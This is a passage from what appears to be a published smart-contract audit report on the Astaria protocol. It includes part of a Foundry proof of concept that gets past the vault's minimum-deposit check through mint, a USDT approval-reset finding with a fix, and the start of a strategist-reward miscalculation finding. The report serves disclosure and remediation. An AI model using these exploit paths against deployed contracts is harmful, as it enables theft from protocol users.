class=\"mtk1\">    </span><span class=\"mtk11\">_mintNoDepositApproveRouter</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">), </span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createPublicVault</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">delegate:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistTwo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">epochLength:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">14</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// after alice deposits 50 ether WETH in publicVault, publicVault&#39;s share price becomes 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_lendToVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">Lender</span><span class=\"mtk1\">({</span><span class=\"mtk12\">addr:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountToLend:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">budget</span><span class=\"mtk1\">}), </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// the borrower borrows 10 ether WETH from publicVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, </span><span class=\"mtk12\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack1</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_commitToLien</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">vault:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategistPK:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOnePK</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenContract:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">lienDetails:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">standardLienDetails</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">isFirstLien:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// the borrower repays for the lien after 9 days, and publicVault&#39;s share price becomes bigger than 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">9</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// bob owns 50 ether WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">budget</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">budget</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetsIn</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// for publicVault at this moment, 99265705739 shares are equivalent to (100 gwei + 1) WETH according to previewMint function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharesIn</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">convertToShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetsIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharesIn</span><span class=\"mtk1\">, </span><span class=\"mtk7\">99265705739</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">previewMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharesIn</span><span class=\"mtk1\">), </span><span class=\"mtk12\">assetsIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// bob is unable to call publicVault&#39;s deposit function for depositing (100 gwei + 1) WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;VALUE_TOO_SMALL&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetsIn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// bob is also unable to call publicVault&#39;s deposit function for depositing a little more than (100 gwei + 1) WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;VALUE_TOO_SMALL&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetsIn</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// however, bob is able to call publicVault&#39;s mint function for minting 99265705739 shares while transferring (100 gwei + 1) WETH to publicVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharesIn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>ERC4626Cloned.deposit</code> function can be updated to directly compare the <code>assets</code> input to <code>minDepositAmount()</code> for the minimum deposit requirement while keeping the <code>ERC4626Cloned.mint</code> function as is. Alternatively, the <code>ERC4626Cloned.mint</code> function can be updated to directly compare the <code>shares</code> input to <code>minDepositAmount()</code> for the minimum deposit requirement while keeping the <code>ERC4626Cloned.deposit</code> function as is.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/486\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-07-improper-approval-mechanism-of-clearing-house\" style=\"position:relative;\"><a href=\"#m-07-improper-approval-mechanism-of-clearing-house\" aria-label=\"m 07 improper approval mechanism of clearing house permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/472\">[M-07] Improper Approval Mechanism of Clearing House</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/472\">0xsomeone</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/538\">tsvetanovv</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/462\">ayeslick</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/ClearingHouse.sol#L148-L151\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/ClearingHouse.sol#L148-L151</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/ClearingHouse.sol#L160-L165\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/ClearingHouse.sol#L160-L165</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L637-L641\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L637-L641</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/CollateralToken.sol#L566-L577\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/CollateralToken.sol#L566-L577</a></p>\n<p>The <code>ClearingHouse</code> implementation performs a <code>@solmate</code>-based <code>safeApprove</code> instruction ([1]) with the remaining <code>balanceOf(address(this))</code> but contains code handling any remainder of funds that may remain in the contract [2]. Investigation of the <code>payDebtViaClearingHouse</code> function will indicate that the function may not consume the maximum approval that was set to the <code>TRANSFER_PROXY</code> [3].</p>\n<p>As a result, any consequent invocation of <code>_execute</code> via <code>safeTransferFrom</code> from OpenSea with a <code>paymentToken</code> (i.e. <code>identifier</code>) such as USDT would fail. Given that the <code>ClearingHouse</code> of a particular <code>collateralId</code> is created only once, this vulnerability will impact consequent listings and cause them to fatally fail for a token that has been used in the past and is part of the non-compliant EIP-20 tokens, with USDT being the prime and most popular example.</p>\n<p>The code in USDT that causes this complication is as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(!((</span><span class=\"mtk12\">_value</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; (</span><span class=\"mtk12\">allowed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_spender</span><span class=\"mtk1\">] != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The vulnerability is clearly defined above, however, for testing purposes, the <code>ClearingHouse::safeTransferFrom</code> function of a particular clearing house instance can be invoked twice with the same arguments. The second invocation will fail provided that the first invocation provided a token balance that exceeds the number of funds necessary for the debt payment which should be denoted in USDT.</p>\n<p>On an important note, if the code used <code>safeApprove</code> from <code>@openzeppelin</code> this issue would affect any token, however, it is limited to non-standard tokens due to the usage of the <code>@solmate</code> implementation of <code>safeApprove</code>.</p>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual review of the codebase. Historically, findings pertaining to incorrect approval mechanisms that do not support USDT have been marked as “medium” in severity in the past in the following cases:</p>\n<ul>\n<li><a href=\"https://code4rena.com/reports/2022-05-rubicon/#m-08-usdt-is-not-supported-because-of-approval-mechanism\">Rubicon</a></li>\n<li><a href=\"https://code4rena.com/reports/2022-04-dualityfocus/#m-03-not-calling-approve0-before-setting-a-new-approval-causes-the-call-to-revert-when-used-with-tether-usdt\">Duality Focus</a></li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We advise approvals to be properly handled by evaluating whether a non-zero approval already exists and in such an instance nullifying it before re-setting it to a non-zero value. Example below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Optimizing lookup</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transferProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">TRANSFER_PROXY</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// If existing approval is non-zero -&gt; set it to zero</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">allowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">transferProxy</span><span class=\"mtk1\">) != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">transferProxy</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Set non-zero approval</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">transferProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">liquidatorPayment</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<hr>\n<h2 id=\"m-08-public-vault-strategist-reward-is-not-calculated-correctly\" style=\"position:relative;\"><a href=\"#m-08-public-vault-strategist-reward-is-not-calculated-correctly\" aria-label=\"m 08 public vault strategist reward is not calculated correctly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/435\">[M-08] Public vault strategist reward is not calculated correctly</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/435\">evan</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/391\">PaludoX0</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L597-L609\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L597-L609</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L819\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L819</a></p>\n<p>Strategist interest reward is not calculated correctly. The reward will almost always be calculated with interestOwed, regardless of the amount paid.</p>\n<p>As a result, the strategist gets paid more than they are supposed to. Even if the borrower hasn’t made a single payment, the strategist can make a tiny payment on behalf of the borrower to trigger this calculation.</p>\n<p>This also encourages the strategist to maximize interestOwed and make tiny payments on behalf of the borrower. This can trigger a compound interest vulnerability which I’ve made a separate report about.</p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a href=\"#proof-of-concept-26\" aria-label=\"proof of concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 